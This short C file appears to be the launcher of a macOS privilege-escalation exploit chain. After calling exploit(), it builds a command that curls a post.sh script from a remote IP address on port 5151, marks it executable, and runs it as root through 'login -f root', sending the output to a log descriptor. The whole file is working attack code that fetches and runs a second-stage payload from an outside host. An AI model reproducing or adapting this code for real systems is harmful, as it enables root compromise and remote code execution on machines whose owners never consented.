#include "eop/eop_common.h"
#include "fullchain.h"

void _start() {
    exploit();
    printf("done\n");
    char ip[32];
    sprintf(ip, CSTR("%hhu.%hhu.%hhu.%hhu"), ipaddr[0], ipaddr[1], ipaddr[2], ipaddr[3]);
    char cmd[512];
    sprintf(cmd, CSTR("(curl -o /tmp/post.sh http://%s:5151/post.sh && chmod +x /tmp/post.sh && echo %s > /tmp/ip && login -f root /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal /tmp/post.sh) 2>&%u 1>&%u"), ip, ip, log_fd, log_fd);
    system(cmd);
}
